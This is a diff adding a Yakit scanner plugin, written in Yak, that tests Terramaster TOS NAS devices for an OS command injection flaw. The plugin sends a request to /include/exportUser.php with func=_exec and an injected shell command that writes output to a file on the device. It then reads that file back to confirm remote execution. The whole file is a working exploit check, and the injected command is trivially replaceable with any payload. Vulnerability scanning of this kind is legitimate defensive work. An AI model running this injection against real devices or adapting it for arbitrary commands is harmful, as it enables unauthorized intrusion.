@@ -1,0 +1,75 @@
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    var url
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    level=["","low","middle","high","critical"]
+    if isTls {
+        url="https://"+addr
+    }else{
+        url="http://"+addr
+    }
+    vulnable=false
+
+    reference="Terramaster TOS 操作系统命令注入漏洞"
+    severity="critical"
+    type="漏洞"
+    r3 = randn(800000000,1000000000)
+    r2 = randn(800000000,1000000000)
+    r1 = str.RandStr(10)
+
+    poc_url_r0= url + `/include/exportUser.php?type=3&cla=application&func=_exec&opt=(expr%20`+ parseStr(r2) +`%20%2B%20`+ parseStr(r3) +`)%3E`+ parseStr(r1) +``
+    req_r0, _ := http.NewRequest("GET",poc_url_r0,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_r0)
+    resp_r0, err := http.Do(req_r0)
+    die(err)
+    bresp,_=http.dump(resp_r0)
+    header, body = poc.Split(bresp)
+    r0_flag = false
+    if resp_r0.StatusCode == 200{
+        r0_flag = true
+    }
+
+    poc_url_r1= url + `/include/`+ parseStr(r1) +``
+    req_r1, _ := http.NewRequest("GET",poc_url_r1,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_r1)
+    resp_r1, err := http.Do(req_r1)
+    die(err)
+    bresp,_=http.dump(resp_r1)
+    header, body = poc.Split(bresp)
+    r1_flag = false
+    if resp_r1.StatusCode == 200 && str.Contains(string(body),parseStr(parseStr(r2 + r3))){
+        r1_flag = true
+    }
+
+    poc_url=poc_url_r1
+    if r0_flag && r1_flag{
+        vulnable = true
+    }
+    if vulnable {
+            yakit.Info("FOUND INFO for %v %v",reference,type)
+            risk.NewRisk(
+                url, risk.severity(severity), 
+                risk.title(sprintf("FOUND %v %v",reference,type)),
+                risk.titleVerbose(sprintf("%v %v",reference,type)),
+                risk.type(type), risk.typeVerbose(type),
+                risk.details({
+                    "request": breq,
+                    "response": bresp,
+                    "url": poc_url,
+                }),
+            )
+        }
+    return
+}
+handle = func(result) {
+    if !result.IsOpen(){
+        return
+    }
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+}
